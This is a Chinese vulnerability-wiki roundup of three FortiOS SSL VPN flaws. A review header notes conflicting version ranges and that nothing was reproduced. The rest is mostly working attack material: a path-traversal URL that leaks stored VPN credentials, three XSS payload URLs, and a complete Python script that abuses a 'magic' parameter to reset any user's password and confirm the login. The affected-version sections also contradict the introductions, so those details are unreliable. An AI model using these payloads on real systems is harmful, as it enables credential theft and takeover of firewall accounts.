---
cve: "CVE-2018-13379"
source: "白阁文库 BaizeSec/bylibrary"
id: "vw-2dfd7df9add4b253069013e6"
entity_id: "ve-2dfd7df9add4b253069013e6"
schema_version: "1"
title: "Fortigate SSL VPN多个漏洞"
product: "Fortinet FortiOS SSL VPN"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2018-13379; CVE-2018-13380; CVE-2018-13382"
referenced_identifiers: ""
prerequisites: "SSL VPN可达；13379有范围，13380/13382简介范围与影响节相反"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Fortinet/Fortigate%20SSL%20VPN%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "unknown"
---

# Fortigate SSL VPN多个漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Fortinet FortiOS SSL VPN
- 本文讨论：CVE-2018-13379；CVE-2018-13380；CVE-2018-13382
- 版本、权限与配置前提：SSL VPN可达；13379有范围，13380/13382简介范围与影响节相反
- 资料类型：三漏洞PoC合集；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 13380/13382影响节列6.2/6.0.5/5.6.8等疑修复版本，与简介受影响范围明显冲突
- 元数据只13379，遗漏两主漏洞
- 改密码脚本Python2且需依赖，无副作用/恢复说明；不存在完整原始出处/修复方案

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 各版本边界、magic改密账号范围待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## **Fortigate**

飞塔防火墙设备的专用名词，Fortinet是飞塔的品牌，而FortiGate  是指飞塔硬件。Fortinet的屡获殊荣的FortiGate系列，是采用ASIC加速的UTM解决方案，可以有效地防御网络层和内容层的攻击。FortiGate解决方案能够发现和消除多层的攻击，比如病毒、蠕虫、入侵、以及Web恶意内容等等实时的应用，而不会导致网络性能下降。它所涉及到的全面的安全体系是涵盖防病毒/反垃圾邮件、防火墙、VPN、入侵检测和防御、反垃圾邮件和流量优化。除了FortiGate以外，Fortinet还提供FortiMail这样的邮件安全的解决方案，和终端、智能手机安全的 FortiClient。

## CVE-2018-13379: Pre-auth任意文件读取

### **漏洞简介**

Fortinet FortiOS路径遍历漏洞（CNNVD-201905-1026、CVE-2018-13379）

漏洞源于该系统未能正确地过滤资源或文件路径中的特殊元素，导致攻击者可以利用该漏洞访问受限目录以外的位置。Fortinet FortiOS 5.6.3版本至5.6.7版本、6.0.0版本至6.0.4版本中的SSL VPN 受此漏洞影响。

### **漏洞影响**

Fortinet FortiOS 5.6.3版本至5.6.7版本、Fortinet FortiOS 6.0.0版本至6.0.4版本中的SSL VPN 受此漏洞影响。

### **复现过程**

可访问链接查看是否存在漏洞

```
/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
```

可查看用户名、密码

可直接登录成功。


### 检测工具

```
https://github.com/ianxtianxt/CVE-2018-13379
```

## CVE-2018-13380 Fortinet FortiOS xss漏洞

### 漏洞简介

Fortinet  FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。 Fortinet FortiOS 6.0.0版本至6.0.4版本、5.6.0版本至5.6.7版本和5.4及之前版本中的SSL VPN  Web门户存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。

### 漏洞影响

Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.8

### 复现过程

```
/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E
/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29
/message?title=x&msg=%26%23<svg/onload=alert(1)>;
```


## CVE-2018-13382 Fortinet FortiOS magic后门

### 漏洞简介

Fortinet  FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。 Fortinet FortiOS 6.0.0版本至6.0.4版本 、5.6.0版本至5.6.8版本和5.4.1版本至5.4.10版本中的SSL VPN Web门户存在授权问题漏洞。该漏洞源于网络系统或产品中缺少身份验证措施或身份验证强度不足。

### 漏洞影响

Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.9 Fortinet Fortios 5.4.11

### 复现过程

登录页面中存在特殊参数magic，一旦这个参数为某个特殊字符串，就可以修改任意用户密码。

可使用POC直接进行修改。


```
import requests, binascii, optparse, sys
from urlparse import urlparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()
import multiprocessing
import colored
from user_agent import generate_user_agent, generate_navigator
bold=True
userAgent=generate_user_agent()
username=""
newpassword=""
ip=""
def setColor(message, bold=False, color=None, onColor=None):
    from termcolor import colored, cprint
    retVal = colored(message, color=color, on_color=onColor, attrs=("bold",))
    return retVal
def checkIP(ip):
    try:
        url = "https://"+ip+"/remote/login?lang=en"
        headers = {"User-Agent": userAgent, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        r=requests.get(url, headers=headers, verify=False)
        if r.status_code==200 and "<title>Please Login</title>" in r.text:
            return True
        else:
            return False
    except requests.exceptions.ConnectionError as e:
        print e
        return False
def changePassword(ip,username,newpassword):
    url = "https://"+ip+"/remote/logincheck"
    headers = {"User-Agent": userAgent, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://"+ip+"/remote/login?lang=en", "Pragma": "no-cache", "Cache-Control": "no-store, no-cache, must-revalidate", "If-Modified-Since": "Sat, 1 Jan 2000 00:00:00 GMT", "Content-Type": "text/plain;charset=UTF-8", "Connection": "close"}
    data = {"ajax": "1", "username": username, "realm": '', "credential": newpassword, "magic": "4tinet2095866", "reqid": "0", "credential2": newpassword}
    r=requests.post(url, headers=headers, data=data, verify=False)
    if r.status_code==200 and 'redir=/remote/hostcheck_install' in r.text:
        return True
    else:
        return False
def testLogin(ip,username,newpassword):
    url = "https://"+ip+"/remote/logincheck"
    headers = {"User-Agent": userAgent, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://"+ip+"/remote/login?lang=en", "Pragma": "no-cache", "Cache-Control": "no-store, no-cache, must-revalidate", "If-Modified-Since": "Sat, 1 Jan 2000 00:00:00 GMT", "Content-Type": "text/plain;charset=UTF-8", "Connection": "close"}
    data = {"ajax": "1", "username": username, "realm": '', "credential": newpassword}
    r=requests.post(url, headers=headers, data=data, verify=False)
    if r.status_code==200 and"redir=/remote/hostcheck_install" in r.text:
            return True
    else:
        return False
parser = optparse.OptionParser()
parser.add_option('-i', action="store", dest="ip", help="e.g. 127.0.0.1:10443")
parser.add_option('-u', action="store", dest="username")
parser.add_option('-p', action="store", dest="password")
options, remainder = parser.parse_args()
if not options.username or not options.password or not options.ip:
    print "[!] Please provide the ip (-i), username (-u) and password (-p)"
    sys.exit()
if options.username:
    username=options.username
if options.password:
    newpassword=options.password
if options.ip:
    ip=options.ip
tmpStatus=checkIP(ip)
if tmpStatus==True:
    print "[*] Checking if target is a Fortigate device "+setColor(" [OK]", bold, color="green")
    if changePassword(ip,username,newpassword)==True:
        print "[*] Using the magic keyword to change password for: ["+username+"]"+setColor(" [OK]", bold, color="green")   
        if testLogin(ip,username,newpassword)==True:
            print "[*] Testing new credentials ["+username+"|"+newpassword+"] "+setColor(" [OK]", bold, color="green")
            print "************** Enjoy your new credentials **************"
        else:
            print "[*] Testing new credentials ["+username+"|"+newpassword+"] "+setColor(" [NOK]", bold, color="red")
    else:
        print "[*] Using the magic keyword to change password for: ["+username+"]"+setColor(" [NOK]", bold, color="red")            
else:
    print "[*] Checking if target is a Fortigate device "+setColor(" [NOK]", bold, color="red")
```


---

> 来源：白阁文库 BaizeSec/bylibrary
